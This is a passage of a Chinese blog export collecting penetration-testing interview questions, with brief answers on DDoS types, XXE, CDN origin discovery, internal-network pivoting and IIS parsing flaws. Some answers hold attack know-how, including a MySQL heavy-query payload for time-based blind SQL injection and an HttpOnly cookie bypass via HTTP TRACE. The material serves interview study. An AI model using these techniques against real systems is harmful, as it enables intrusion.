<p>PDCA（plan do check action）管理循环</p>
<h3 id="说一下等级保护制度"><a href="#说一下等级保护制度" class="headerlink" title="说一下等级保护制度"></a>说一下等级保护制度</h3><p>《信息安全等级保护管理办法》是为规范信息安全等级保护管理，提高信息安全保障能力和水平，维护国家安全、社会稳定和公共利益，保障和促进信息化建设，根据《中华人民共和国计算机信息系统安全保护条例》等有关法律法规而制定的办法。</p>
<h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h3><blockquote>
<p>浅谈信息安全等级保护与ISO27000系列标准的异同 ISSN 1009-3044</p>
</blockquote>
<p>等保是以国家安全、社会秩序和公共利益为出发点，构建国家的安全保障体系。27000系列是以保证组织业务的连续性，缩减业务风险，最大化投资收益为目的，保证组织的业务安全</p>
<h3 id="共性"><a href="#共性" class="headerlink" title="共性"></a>共性</h3><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="排序算法：快排-二分-冒泡"><a href="#排序算法：快排-二分-冒泡" class="headerlink" title="排序算法：快排 二分 冒泡"></a>排序算法：快排 二分 冒泡</h3><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><blockquote>
<p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">http://www.4hou.com/technology/9090.html</a><br><a href="https://blog.csdn.net/quiet_girl/article/details/50716312" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50716312</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（2）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#面试问题记录">面试问题记录</a><ul>
<li><a href="#360">360</a><ul>
<li><a href="#sql的存储引擎">SQL的存储引擎</a></li>
<li><a href="#sql注入写shell的条件用法">SQL注入写shell的条件，用法</a></li>
<li><a href="#gpc是什么开启了怎么绕过">GPC是什么？开启了怎么绕过</a></li>
<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
<li><a href="#iis解析漏洞不同版本有什么漏洞还有什么容器解析漏洞">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</a></li>
<li><a href="#wireshark抓包数据报经过三层交换机路由的变化nat协议描述地址进入内网怎么变化">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</a></li>
<li><a href="#linux计划任务黑客隐藏自己的计划任务会怎么做windows计划任务怎么设定">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</a></li>
<li><a href="#挖过最难的漏洞是什么">挖过最难的漏洞是什么</a></li>
</ul>
</li>
<li><a href="#ukelink">ukelink</a><ul>
<li><a href="#病毒和蠕虫的区别">病毒和蠕虫的区别</a></li>
<li><a href="#dns欺骗是什么">DNS欺骗是什么</a></li>
<li><a href="#DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</a></li>
<li><a href="#陆地land攻击是什么">陆地land攻击是什么</a></li>
<li><a href="#xss有什么执行存储型的xss的危害和原理">xss有什么？执行存储型的xss的危害和原理</a></li>
<li><a href="#渗透测试流程不够清晰太浅显">渗透测试流程？（不够清晰，太浅显</a></li>
<li><a href="#有没有移动端的调试经验-apkipa包分析">有没有移动端的调试经验 apk,ipa包分析</a></li>
<li><a href="#对于云安全的理解">对于云安全的理解</a></li>
<li><a href="#虚拟机逃逸的理解">虚拟机逃逸的理解</a></li>
<li><a href="#英语介绍一下自己">英语介绍一下自己</a></li>
<li><a href="#职业路径">职业路径</a></li>
<li><a href="#大学做过什么相关的事情">大学做过什么相关的事情</a></li>
<li><a href="#在工作会做什么来不断提高自己的能力">在工作会做什么来不断提高自己的能力</a></li>
</ul>
</li>
<li><a href="#卓望">卓望</a><ul>
<li><a href="#渗透测试流程">渗透测试流程</a></li>
<li><a href="#描述渗透项目做了什么">描述渗透项目，做了什么</a></li>
<li><a href="#xss漏洞类型详情修复方案">xss漏洞类型、详情、修复方案</a></li>
<li><a href="#sql注入原理类型waf绕过写shell提权修复方案">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</a></li>
<li><a href="#终端的渗透经验">终端的渗透经验</a></li>
<li><a href="#了解什么比较新的漏洞">了解什么比较新的漏洞</a></li>
<li><a href="#企业内部安全">企业内部安全</a></li>
</ul>
</li>
<li><a href="#安巽">安巽</a><ul>
<li><a href="#算法了解过什么排序">算法？了解过什么排序？</a></li>
<li><a href="#爬虫">爬虫</a><ul>
<li><a href="#页面存在很多js的时候用什么">页面存在很多js的时候，用什么</a></li>
<li><a href="#爬虫的待爬取url量级比较大的时候如何对其去重">爬虫的待爬取URL量级比较大的时候，如何对其去重</a></li>
<li><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么">多线程 异步 协程 多路复用 用哪一个最快 为什么</a></li>
</ul>
</li>
<li><a href="#浏览器的常用编码">浏览器的常用编码</a></li>
<li><a href="#web常用的加密算法有什么">web常用的加密算法有什么</a></li>
<li><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</a></li>
<li><a href="#mysql中like查询会会非常缓慢如何进行优化">mysql中like查询会会非常缓慢，如何进行优化</a></li>
<li><a href="#做了cdn的网站如何获取真实ip">做了cdn的网站如何获取真实IP</a></li>
<li><a href="#渗透的时候如何隐藏自己的身份">渗透的时候如何隐藏自己的身份</a></li>
<li><a href="#主机疑似遭到入侵要看哪里的日志">主机疑似遭到入侵，要看哪里的日志</a></li>
<li><a href="#sql注入漏洞怎么修复">SQL注入漏洞怎么修复</a></li>
</ul>
</li>
<li><a href="#长亭">长亭</a><ul>
<li><a href="#安全研究的方面做过哪些渗透测试的工作">安全研究的方面？做过哪些渗透测试的工作？</a></li>
<li><a href="#只给你一个网址如何进行渗透测试">只给你一个网址，如何进行渗透测试</a></li>
<li><a href="#SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？">SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？</a></li>
<li><a href="#sleep被禁用后还能怎么进行sql注入">sleep被禁用后还能怎么进行sql注入</a></li>
<li><a href="#xss可以控制属性怎么利用">XSS可以控制属性怎么利用</a></li>
<li><a href="#csrf怎么防护">CSRF怎么防护？</a></li>
<li><a href="#请求头中哪些是有危害的">请求头中哪些是有危害的？</a></li>
<li><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</a></li>
<li><a href="#java中间件的漏洞举几个例子">JAVA中间件的漏洞，举几个例子？</a></li>
<li><a href="#iis常见的漏洞">IIS常见的漏洞</a></li>
<li><a href="#python有哪些框架其中出现过哪些漏洞">python有哪些框架，其中出现过哪些漏洞</a></li>
<li><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</a></li>
<li><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</a></li>
<li><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</a></li>
</ul>
</li>
<li><a href="#盛邦">盛邦</a><ul>
<li><a href="#有没有做过协议分析和抓包分析">有没有做过协议分析和抓包分析</a></li>
</ul>
</li>
<li><a href="#翼果">翼果</a><ul>
<li><a href="#mysql查看版本">mysql查看版本？</a></li>
<li><a href="#过安全狗">过安全狗</a></li>
<li><a href="#编程能力平台逆向修改程序入口rootkit有没有研究过">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="面试问题记录"><a href="#面试问题记录" class="headerlink" title="面试问题记录"></a>面试问题记录</h1><blockquote>
<p>CONTACT ME: github.com/leezj9671</p>
</blockquote>
<h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><h3 id="SQL的存储引擎"><a href="#SQL的存储引擎" class="headerlink" title="SQL的存储引擎"></a>SQL的存储引擎</h3><h3 id="SQL注入写shell的条件，用法"><a href="#SQL注入写shell的条件，用法" class="headerlink" title="SQL注入写shell的条件，用法"></a>SQL注入写shell的条件，用法</h3><h3 id="GPC是什么？开启了怎么绕过"><a href="#GPC是什么？开启了怎么绕过" class="headerlink" title="GPC是什么？开启了怎么绕过"></a>GPC是什么？开启了怎么绕过</h3><h3 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h3><h3 id="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"><a href="#IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞" class="headerlink" title="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"></a>IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</h3><h3 id="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"><a href="#wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化" class="headerlink" title="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"></a>wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</h3><h3 id="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"><a href="#linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定" class="headerlink" title="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"></a>linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</h3><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p>
<h3 id="挖过最难的漏洞是什么"><a href="#挖过最难的漏洞是什么" class="headerlink" title="挖过最难的漏洞是什么"></a>挖过最难的漏洞是什么</h3><h2 id="ukelink"><a href="#ukelink" class="headerlink" title="ukelink"></a>ukelink</h2><h3 id="病毒和蠕虫的区别"><a href="#病毒和蠕虫的区别" class="headerlink" title="病毒和蠕虫的区别"></a>病毒和蠕虫的区别</h3><h3 id="DNS欺骗是什么"><a href="#DNS欺骗是什么" class="headerlink" title="DNS欺骗是什么"></a>DNS欺骗是什么</h3><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
<h3 id="DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议"><a href="#DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议" class="headerlink" title="DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议"></a>DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</h3><p>SYN攻击 防火墙、特征匹配<br>ACK FLOOD<br>UDP FLOOD<br>ICMP FLOOD<br>CC http的get请求<br>陆地攻击 源IP和目的IP都为同一个<br>UDP DNS QUERY 向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息</p>
<h3 id="陆地land攻击是什么"><a href="#陆地land攻击是什么" class="headerlink" title="陆地land攻击是什么"></a>陆地land攻击是什么</h3><h3 id="xss有什么？执行存储型的xss的危害和原理"><a href="#xss有什么？执行存储型的xss的危害和原理" class="headerlink" title="xss有什么？执行存储型的xss的危害和原理"></a>xss有什么？执行存储型的xss的危害和原理</h3><h3 id="渗透测试流程？（不够清晰，太浅显"><a href="#渗透测试流程？（不够清晰，太浅显" class="headerlink" title="渗透测试流程？（不够清晰，太浅显"></a>渗透测试流程？（不够清晰，太浅显</h3><h3 id="有没有移动端的调试经验-apk-ipa包分析"><a href="#有没有移动端的调试经验-apk-ipa包分析" class="headerlink" title="有没有移动端的调试经验 apk,ipa包分析"></a>有没有移动端的调试经验 apk,ipa包分析</h3><h3 id="对于云安全的理解"><a href="#对于云安全的理解" class="headerlink" title="对于云安全的理解"></a>对于云安全的理解</h3><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p>
<h3 id="虚拟机逃逸的理解"><a href="#虚拟机逃逸的理解" class="headerlink" title="虚拟机逃逸的理解"></a>虚拟机逃逸的理解</h3><p>虚拟机之间通信或上层主机的通信</p>
<h3 id="英语介绍一下自己"><a href="#英语介绍一下自己" class="headerlink" title="英语介绍一下自己"></a>英语介绍一下自己</h3><h3 id="职业路径"><a href="#职业路径" class="headerlink" title="职业路径"></a>职业路径</h3><h3 id="大学做过什么相关的事情"><a href="#大学做过什么相关的事情" class="headerlink" title="大学做过什么相关的事情"></a>大学做过什么相关的事情</h3><h3 id="在工作会做什么来不断提高自己的能力"><a href="#在工作会做什么来不断提高自己的能力" class="headerlink" title="在工作会做什么来不断提高自己的能力"></a>在工作会做什么来不断提高自己的能力</h3><h2 id="卓望"><a href="#卓望" class="headerlink" title="卓望"></a>卓望</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><h3 id="描述渗透项目，做了什么"><a href="#描述渗透项目，做了什么" class="headerlink" title="描述渗透项目，做了什么"></a>描述渗透项目，做了什么</h3><h3 id="xss漏洞类型、详情、修复方案"><a href="#xss漏洞类型、详情、修复方案" class="headerlink" title="xss漏洞类型、详情、修复方案"></a>xss漏洞类型、详情、修复方案</h3><h3 id="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"><a href="#SQL注入原理、类型，waf绕过，写shell，提权，修复方案" class="headerlink" title="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"></a>SQL注入原理、类型，waf绕过，写shell，提权，修复方案</h3><h3 id="终端的渗透经验"><a href="#终端的渗透经验" class="headerlink" title="终端的渗透经验"></a>终端的渗透经验</h3><h3 id="了解什么比较新的漏洞"><a href="#了解什么比较新的漏洞" class="headerlink" title="了解什么比较新的漏洞"></a>了解什么比较新的漏洞</h3><h3 id="企业内部安全"><a href="#企业内部安全" class="headerlink" title="企业内部安全"></a>企业内部安全</h3><p>信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭PC、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、IP和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）</p>
<h2 id="安巽"><a href="#安巽" class="headerlink" title="安巽"></a>安巽</h2><h3 id="算法？了解过什么排序？"><a href="#算法？了解过什么排序？" class="headerlink" title="算法？了解过什么排序？"></a>算法？了解过什么排序？</h3><p>快速排序 冒泡排序</p>
<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="页面存在很多js的时候，用什么"><a href="#页面存在很多js的时候，用什么" class="headerlink" title="页面存在很多js的时候，用什么"></a>页面存在很多js的时候，用什么</h4><p>phnatomJS selenium execjs</p>
<h4 id="爬虫的待爬取URL量级比较大的时候，如何对其去重"><a href="#爬虫的待爬取URL量级比较大的时候，如何对其去重" class="headerlink" title="爬虫的待爬取URL量级比较大的时候，如何对其去重"></a>爬虫的待爬取URL量级比较大的时候，如何对其去重</h4><ul>
<li>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取</li>
<li>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率</li>
<li>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大</li>
<li>使用Map或是一个定长数组记录某一个URL是否被访问过</li>
<li>布隆过滤器(bloom filter)，bitmap</li>
</ul>
<h4 id="多线程-异步-协程-多路复用-用哪一个最快-为什么"><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么" class="headerlink" title="多线程 异步 协程 多路复用 用哪一个最快 为什么"></a>多线程 异步 协程 多路复用 用哪一个最快 为什么</h4><blockquote>
<p><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a></p>
</blockquote>
<p>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p>
<p>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。</p>
<p>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p>
<p>IO多路复用 异步阻塞IO 线程轮询IO</p>
<h3 id="浏览器的常用编码"><a href="#浏览器的常用编码" class="headerlink" title="浏览器的常用编码"></a>浏览器的常用编码</h3><p>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a> </p>
<h3 id="web常用的加密算法有什么"><a href="#web常用的加密算法有什么" class="headerlink" title="web常用的加密算法有什么"></a>web常用的加密算法有什么</h3><p>非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA base64</p>
<h3 id="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？" class="headerlink" title="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"></a>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</h3><p>拿下机器后<br>内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁  这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的   拿到的各种记录 会暴露出部分内网通讯的ip</p>
<p>内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p>
<h3 id="mysql中like查询会会非常缓慢，如何进行优化"><a href="#mysql中like查询会会非常缓慢，如何进行优化" class="headerlink" title="mysql中like查询会会非常缓慢，如何进行优化"></a>mysql中like查询会会非常缓慢，如何进行优化</h3><p>分词索引</p>
<h3 id="做了cdn的网站如何获取真实IP"><a href="#做了cdn的网站如何获取真实IP" class="headerlink" title="做了cdn的网站如何获取真实IP"></a>做了cdn的网站如何获取真实IP</h3><ol>
<li>多地ping看是否有cdn</li>
<li>邮件订阅或者rss订阅</li>
<li>二级域名可能不会做cdn</li>
<li>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns</li>
<li>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a></li>
<li>phpinfo上显示的信息</li>
</ol>
<h3 id="渗透的时候如何隐藏自己的身份"><a href="#渗透的时候如何隐藏自己的身份" class="headerlink" title="渗透的时候如何隐藏自己的身份"></a>渗透的时候如何隐藏自己的身份</h3><h3 id="主机疑似遭到入侵，要看哪里的日志"><a href="#主机疑似遭到入侵，要看哪里的日志" class="headerlink" title="主机疑似遭到入侵，要看哪里的日志"></a>主机疑似遭到入侵，要看哪里的日志</h3><h3 id="SQL注入漏洞怎么修复"><a href="#SQL注入漏洞怎么修复" class="headerlink" title="SQL注入漏洞怎么修复"></a>SQL注入漏洞怎么修复</h3><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><h3 id="安全研究的方面？做过哪些渗透测试的工作？"><a href="#安全研究的方面？做过哪些渗透测试的工作？" class="headerlink" title="安全研究的方面？做过哪些渗透测试的工作？"></a>安全研究的方面？做过哪些渗透测试的工作？</h3><h3 id="只给你一个网址，如何进行渗透测试"><a href="#只给你一个网址，如何进行渗透测试" class="headerlink" title="只给你一个网址，如何进行渗透测试"></a>只给你一个网址，如何进行渗透测试</h3><h3 id="SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"><a href="#SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？" class="headerlink" title="SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？"></a>SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</h3><h3 id="sleep被禁用后还能怎么进行sql注入"><a href="#sleep被禁用后还能怎么进行sql注入" class="headerlink" title="sleep被禁用后还能怎么进行sql注入"></a>sleep被禁用后还能怎么进行sql注入</h3><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。<br>mysql：<code>AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</code></p>
<h3 id="XSS可以控制属性怎么利用"><a href="#XSS可以控制属性怎么利用" class="headerlink" title="XSS可以控制属性怎么利用"></a>XSS可以控制属性怎么利用</h3><h3 id="CSRF怎么防护？"><a href="#CSRF怎么防护？" class="headerlink" title="CSRF怎么防护？"></a>CSRF怎么防护？</h3><p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p>
<h3 id="请求头中哪些是有危害的？"><a href="#请求头中哪些是有危害的？" class="headerlink" title="请求头中哪些是有危害的？"></a>请求头中哪些是有危害的？</h3><p>Cookie</p>
<h3 id="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过" class="headerlink" title="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过"></a>XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</h3><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的</p>
<p>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml</p>
<p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p>
<p>javax.xml.stream.XMLStreamReader;</p>
<p>javax.xml.parsers.DocumentBuilderFactory;</p>
<h3 id="JAVA中间件的漏洞，举几个例子？"><a href="#JAVA中间件的漏洞，举几个例子？" class="headerlink" title="JAVA中间件的漏洞，举几个例子？"></a>JAVA中间件的漏洞，举几个例子？</h3><p>常见的是反序列化漏洞</p>
<h3 id="IIS常见的漏洞"><a href="#IIS常见的漏洞" class="headerlink" title="IIS常见的漏洞"></a>IIS常见的漏洞</h3><p>常见的为解析漏洞，6.0有<br>/test.asp/test.jpg<br>  test.asp;.jpg<br>  7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx<br>  原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p>
<h3 id="python有哪些框架，其中出现过哪些漏洞"><a href="#python有哪些框架，其中出现过哪些漏洞" class="headerlink" title="python有哪些框架，其中出现过哪些漏洞"></a>python有哪些框架，其中出现过哪些漏洞</h3><p>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值<br>如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中html标签属性字段绕过xss过滤。</p>
<p>Django出现过目录遍历漏洞</p>
<h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？" class="headerlink" title="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？"></a>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？" class="headerlink" title="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？"></a>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie" class="headerlink" title="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie"></a>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p>
<h2 id="盛邦"><a href="#盛邦" class="headerlink" title="盛邦"></a>盛邦</h2><h3 id="有没有做过协议分析和抓包分析"><a href="#有没有做过协议分析和抓包分析" class="headerlink" title="有没有做过协议分析和抓包分析"></a>有没有做过协议分析和抓包分析</h3><h2 id="翼果"><a href="#翼果" class="headerlink" title="翼果"></a>翼果</h2><h3 id="mysql查看版本？"><a href="#mysql查看版本？" class="headerlink" title="mysql查看版本？"></a>mysql查看版本？</h3><h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过"><a href="#编程能力-平台逆向-修改程序入口-rootkit有没有研究过" class="headerlink" title="编程能力/平台逆向/修改程序入口/rootkit有没有研究过"></a>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3>]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试问题2019版</title>
    <url>/2019/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#head1"> 思路流程</a><ul>
<li><a href="#head2"> 信息收集</a></li>
<li><a href="#head3"> 漏洞挖掘</a></li>
<li><a href="#head4"> 漏洞利用&amp;权限提升</a></li>
<li><a href="#head5"> 清除测试数据&amp;输出报告</a></li>
<li><a href="#head6"> 复测</a></li>
</ul>
</li>
<li><a href="#head7"> 问题</a></li>
<li><a href="#head8"> 深信服一面:</a></li>
<li><a href="#head9"> SQL注入防护</a></li>
<li><a href="#head10"> 为什么参数化查询可以防止sql注入</a></li>
<li><a href="#head11"> SQL头注入点</a></li>
<li><a href="#head12"> 盲注是什么？怎么盲注？</a></li>
